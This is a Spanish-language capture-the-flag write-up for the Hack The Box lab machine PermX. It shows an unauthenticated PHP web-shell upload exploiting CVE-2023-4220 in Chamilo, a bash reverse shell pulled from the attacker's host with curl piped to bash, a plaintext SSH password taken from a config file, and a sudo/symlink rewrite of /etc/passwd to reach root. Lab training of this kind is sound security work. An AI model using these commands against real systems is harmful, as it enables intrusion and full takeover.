---
title: PermX
description: PermX es una máquina Linux de dificultad fácil que presenta un sistema de gestión de aprendizaje vulnerable a cargas de archivos sin restricciones. Esta vulnerabilidad se aprovecha para obtener acceso inicial en la máquina. La enumeración revela credenciales que permiten acceder mediante SSH. Luego, se explota una configuración incorrecta de sudo para obtener una root shell.
date: 2024-07-16
toc: true
pin: false
image:
 path: /assets/img/htb-writeup-permx/permx_logo.png
categories:
  - Hack_The_Box
  - Machines
tags:
  - linux
  - hack_the_box
  - fuzzing_web
  - cve
  - rfi
  - rce
  - xss
  - data_leaks
  - misconfigurations
  - sudo_abuse
  - http
  - ssh
  - tcp
  - symlink_abuse
  - php
  - interactive_tty
  - information_gathering
  - web_analysis
  - cve_exploitation
  - lateral_movement
  - privilege_escalation

---
## Information Gathering

```terminal
/home/kali/Documents/htb/machines/permx:-$ ping -c 1 10.10.11.23
PING 10.10.11.23 (10.10.11.23) 56(84) bytes of data.
64 bytes from 10.10.11.23: icmp_seq=1 ttl=63 time=551 ms
	
--- 10.10.11.23 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 551.259/551.259/551.259/0.000 ms
```
```terminal
/home/kali/Documents/htb/machines/permx:-$ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.23 -oG map1
Host: 10.10.11.23 ()    Status: Up
Host: 10.10.11.23 ()    Ports: 22/open/tcp//ssh///, 80/open/tcp//http///
```
```terminal
/home/kali/Documents/htb/machines/permx:-$ sudo nmap -sCV -p22,80 -vvv 10.10.11.23 -oN map2 
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e2:5c:5d:8c:47:3e:d8:72:f7:b4:80:03:49:86:6d:ef (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAyYzjPGuVga97Y5vl5BajgMpjiGqUWp23U2DO9Kij5AhK3lyZFq/rroiDu7zYpMTCkFAk0fICBScfnuLHi6NOI=
|   256 1f:41:02:8e:6b:17:18:9c:a0:ac:54:23:e9:71:30:17 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP8A41tX6hHpQeDLNhKf2QuBM7kqwhIBXGZ4jiOsbYCI
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://permx.htb
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
```terminal
/home/kali/Documents/htb/machines/permx:-$ echo '10.10.11.23\tpermx.htb' | sudo tee -a /etc/hosts

/home/kali/Documents/htb/machines/permx:-$ whatweb permx.htb
http://permx.htb [200 OK] Apache[2.4.52], Bootstrap, Country[RESERVED][ZZ], Email[permx@htb.com], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[10.10.11.23], JQuery[3.4.1], Script, Title[eLEARNING]
```

---
## Web Analysis

![](/assets/img/htb-writeup-permx/permx1.png)

La aplicación es una simple web estática sin ninguna funcionalidad.

Fuzzear directorios tampoco resultó en nada. 

```terminal
/home/kali/Documents/htb/machines/permx:-$ dirsearch -u http://permx.htb/ -x 400,403,404
[16:55:22] 301 -  303B  - /js  ->  http://permx.htb/js/                     
[16:55:47] 200 -   3KB  - /404.html                                         
[16:55:52] 200 -   4KB  - /about.html                                       
[16:56:58] 200 -   3KB  - /contact.html                                     
[16:57:01] 301 -  304B  - /css  ->  http://permx.htb/css/                   
[16:57:38] 301 -  304B  - /img  ->  http://permx.htb/img/                   
[16:57:48] 200 -  448B  - /js/                                              
[16:57:52] 301 -  304B  - /lib  ->  http://permx.htb/lib/                   
[16:57:52] 200 -  491B  - /lib/                                             
[16:57:53] 200 -  649B  - /LICENSE.txt
```

Pero, al enumerar subdominios, encuentro un panel de inicio de sesión.

```terminal
/home/kali/Documents/htb/machines/permx:-$ wfuzz -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -u http://permx.htb/ -H 'Host:FUZZ.permx.htb' -t 50 --hc 302
ID           Response   Lines    Word       Chars       Payload

000000001:   200        586 L    2466 W     36182 Ch    "www"
000000477:   200        352 L    940 W      19347 Ch    "lms"
```
```terminal
/home/kali/Documents/htb/machines/permx:-$ sudo sed -i '$d' /etc/hosts
/home/kali/Documents/htb/machines/permx:-$ echo '10.10.11.23\tpermx.htb\tlms.permx.htb' | sudo tee -a /etc/hosts
```
```terminal
/home/kali/Documents/htb/machines/permx:-$ whatweb lms.permx.htb
http://lms.permx.htb [200 OK] Apache[2.4.52], Bootstrap, Chamilo[1], Cookies[GotoCourse,ch_sid], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], HttpOnly[GotoCourse,ch_sid], IP[10.10.11.23], JQuery, MetaGenerator[Chamilo 1], Modernizr, PasswordField[password], PoweredBy[Chamilo], Script, Title[PermX - LMS - Portal], X-Powered-By[Chamilo 1], X-UA-Compatible[IE=edge]
```

![](/assets/img/htb-writeup-permx/permx2.png)

El subdominio cuenta con el archivo `robots.txt`, del que se puede extraer mucha información.

![](/assets/img/htb-writeup-permx/permx3.png)

Concretamente, se puede encontrar la versión exacta del software que se emplea `(Chamilo 1.11)`.

![](/assets/img/htb-writeup-permx/permx4.png)

La cual cuenta con vulnerabilidades conocidas, [CVE-2023-4220](https://nvd.nist.gov/vuln/detail/CVE-2023-4220).

---
## CVE Exploitation

La siguiente página web detalla muy bien la forma de explotar esta vulnerabilidad.

<https://starlabs.sg/advisories/23/23-4220/>

Como explica la página web, parece que es posible cargar archivos arbitrarios en el directorio `http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/` de forma no autenticada.

Al buscar en la dirección, el directorio está repleto de reverse shells de otros usuarios.

![](/assets/img/htb-writeup-permx/permx5.png)

El PoC es muy sencillo, simplemente hay que crear un archivo PHP que ejecute un comando en el sistema y, con curl, subirlo a la página.

```terminal
/home/kali/Documents/htb/machines/permx:-$ echo '<?php system("id"); ?>' > rce1.php
/home/kali/Documents/htb/machines/permx:-$ curl -F 'bigUploadFile=@rce1.php' 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported'
The file has successfully been uploaded.
```

Si actualizo `http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/`, se puede apreciar que el archivo `rce1.php` está subido.

![](/assets/img/htb-writeup-permx/permx6.png)

Ahora se puede ejecutar el archivo PHP para que proporcione el `id` del usuario.

```terminal
/home/kali/Documents/htb/machines/permx:-$ curl 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/rce1.php'
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Una forma de conseguir acceso al sistema sería compartiendo un `index.html` que contenga una reverse shell en bash.

```
/home/kali/Documents/htb/machines/permx:-$ echo '<?php system($_GET["cmd"]); ?>' > rce2.php

/home/kali/Documents/htb/machines/permx:-$ curl -F 'bigUploadFile=@rce2.php' 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported
The file has successfully been uploaded.

/home/kali/Documents/htb/machines/permx:-$ curl 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/rce2.php?cmd=whoami'
www-data

/home/kali/Documents/htb/machines/permx:-$ echo '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.16.3/4443 0>&1' > index.html
```

Luego de crear el archivo `index`, levanto un servidor con Python para compartir el archivo.

Ejecutando un curl hacia mi IP, la página `lms.permx.htb` accede correctamente al archivo.

```terminal
/home/kali/Documents/htb/machines/permx:-$ python3 -m http.server 80

/home/kali/Documents/htb/machines/permx:-$ curl 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/rce2.php?cmd=curl+10.10.16.3'
```

![](/assets/img/htb-writeup-permx/permx7.png)

Solo queda ponerme a la escucha con Netcat y lanzar el curl nuevamente, agregándole al final el comando bash para que se ejecute la reverse shell.

```terminal
/home/kali/Documents/htb/machines/permx:-$ nc -lvnp 4443

/home/kali/Documents/htb/machines/permx:-$ curl 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/rce2.php?cmd=curl+10.10.16.3|bash'
```

![](/assets/img/htb-writeup-permx/permx8.png)

---
## Lateral Movement

Realizo el tratamiento de la TTY.

```
www-data@pemrx:/var/www/chamilo/main/inc/lib/javascript/bigupload/files$ scrip /dev/null -c bash
www-data@pemrx:/var/www/chamilo/main/inc/lib/javascript/bigupload/files$ ^Z
/home/kali/Documents/htb/machines/permx:-$ stty raw -echo; fg
www-data@pemrx:/var/www/chamilo/main/inc/lib/javascript/bigupload/files$ reset xterm
www-data@pemrx:/var/www/chamilo/main/inc/lib/javascript/bigupload/files$ export TERM=xterm
www-data@pemrx:/var/www/chamilo/main/inc/lib/javascript/bigupload/files$ stty rows 40 columns 176
```

Utilicé Linpeas para encontrar las credenciales del usuario `mtz` en el archivo de configuración.

```
www-data@pemrx:/var/www/chamilo$ cat app/config/configuration.php | head -30
```

![](/assets/img/htb-writeup-permx/permx9.png)

```terminal
www-data@pemrx:/var/www/chamilo$ ls -l /home
drwxr-x--- 5 mtz mtz 4096 Nov 8 22:42 mtz

/home/kali/Documents/htb/machines/permx:-$ ssh mtz@10.10.11.23
mtz@10.10.11.23's Password: 03F6lY3uXAP2bkW8

mtz@permx:~$ cat user.txt
```

---
## Privilege Escalation

Se puede ejecutar el archivo `/opt/acl.sh` como sudo sin contraseña.

```terminal
mtz@permx:~$ sudo -l
Matching Defaults entries for mtz on permx:
  env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
User mtz may run the following commands on permx:
  (ALL : ALL) NOPASSWD: /opt/acl.sh

mtz@permx:~$ cat /opt/acl.sh
```

![](/assets/img/htb-writeup-permx/permx10.png)


```terminal
mtz@permx:~$ ls -l /opt/acl.sh
-rwxr-xr-x 1 root root 419 Nov 8 22:42 /opt/acl.sh

mtz@permx:~$ sudo /opt/acl.sh
Usage: /opt/acl.sh user perm file
```

Este script toma el usuario, los permisos y el archivo de destino como parámetros, y cambia los permisos de este archivo. El archivo de destino debe estar en `/home/mtz`.

Por tanto, se puede crear un enlace simbólico al archivo `/etc/passwd` y, con el script, darle acceso de lectura, escritura y ejecución al usuario `mtz`.

```terminal
mtz@permx:~$ ln -s /etc/passwd passwd
mtz@permx:~$ ls -l
drwxrwxrwx 1 mtz mtz 11 Nov 8 02:16 passwd -> /etc/passwd
mtz@permx:~$ sudo /opt/acl.sh mtz rwx /home/mtz/passwd

mtz@permx:~$ nano passwd
```

![](/assets/img/htb-writeup-permx/permx11.png)

De esta forma, se puede crear un hash de una contraseña y asignárselo al usuario `root` en el enlace simbólico.

```terminal
mtz@permx:~$ openssl passwd
Password: 123456
Verifying - Password: 123456
$1$lJHSEER5$QlDf0Ekb7Ju6.5gwLiNP91

mtz@permx:~$ nano passwd
```

![](/assets/img/htb-writeup-permx/permx12.png)

```terminal
mtz@permx:~$ su root
Password: 123456
root@permx:/home/mtz# cat /root/root.txt
```

> <a href="https://www.hackthebox.com/achievement/machine/1521382/613" target="_blank">Permx Machine from Hack The Box has been Pwned</a>
{: .prompt-tip }